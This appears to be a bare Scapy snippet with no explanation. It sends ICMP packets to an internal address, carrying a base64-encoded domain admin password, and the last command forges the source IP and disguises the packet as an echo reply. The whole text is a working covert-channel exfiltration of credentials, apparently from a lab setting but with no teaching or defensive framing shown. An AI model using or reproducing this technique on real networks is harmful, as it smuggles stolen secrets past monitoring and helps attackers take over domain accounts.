p=sr1(IP(dst="172.31.24.10")/ICMP()/"VGhpcyBpcyB0aGUgZG9tYWluIGFkbWluIHBhc3N3b3JkOiBnczJKODJ5dVVrc24xMkQ==")
p.show()

send(IP(src="172.31.24.22", dst="172.31.24.10", ttl=128)/ICMP(type=0)/"VGhpcyBpcyB0aGUgZG9tYWluIGFkbWluIHBhc3N3b3JkOiBnczJKODJ5dVVrc24xMkQ==")
